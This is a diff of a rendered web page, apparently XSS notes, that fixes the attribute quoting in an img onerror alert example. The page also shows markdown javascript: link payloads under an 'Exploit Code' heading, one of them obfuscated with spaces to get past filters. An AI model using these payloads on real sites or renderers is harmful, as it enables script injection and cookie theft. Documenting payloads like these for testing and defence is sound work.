@@ -172,7 +172,7 @@ if (!doNotTrack) {
 </code></pre></div><ul>
 <li>EX01 - HTML</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert(&#39;XSS&#39;) alt=&#34;</span><span class="na">xss</span><span class="err">&#34;</span><span class="p">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;alert(&#39;XSS&#39;)&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;xss&#34;</span><span class="p">&gt;</span>
 </code></pre></div><h2 id="exploit-code">Exploit Code</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">[<span class="nt">a</span>](<span class="na">javascript:prompt(document.cookie</span>))
 [<span class="nt">a</span>](<span class="na">j    a   v   a   s   c   r   i   p   t:prompt(document.cookie</span>))
